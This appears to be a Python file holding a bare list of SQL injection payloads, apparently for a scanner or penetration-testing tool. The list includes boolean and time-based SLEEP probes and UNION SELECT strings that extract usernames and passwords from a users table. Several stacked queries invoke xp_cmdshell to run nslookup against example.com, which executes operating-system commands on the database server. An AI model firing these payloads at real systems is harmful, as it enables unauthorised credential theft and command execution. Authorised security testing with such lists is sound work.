# sql_injection_payloads.py

sql_injection_payloads = [
    "' OR '1'='1",
    "' OR '1'='2",
    "test' AND 1=1 -- ",
    "test' AND 1=2 -- ",
    "' OR IF(1=1, SLEEP(5), 0) -- ",
    "' OR IF(1=2, SLEEP(5), 0) -- ",
    "test' AND IF(1=1, SLEEP(5), 0) -- ",
    "test' AND IF(1=2, SLEEP(5), 0) -- ",
    "' OR 1=1 -- ",
    "' OR 1=2 -- ",
    "test' AND 1=1 -- ",
    "test' AND 1=2 -- ",
    "' UNION SELECT NULL, NULL, NULL -- ",
    "' UNION SELECT username, password, NULL FROM users -- ",
    "test' UNION SELECT NULL, NULL, NULL -- ",
    "test' UNION SELECT username, password, NULL FROM users -- ",
    "' OR 1=1; EXEC xp_cmdshell('nslookup example.com') -- ",
    "' OR 1=1; EXEC master..xp_cmdshell('nslookup example.com') -- ",
    "test' AND 1=1; EXEC xp_cmdshell('nslookup example.com') -- ",
    "test' AND 1=1; EXEC master..xp_cmdshell('nslookup example.com') -- ",
]
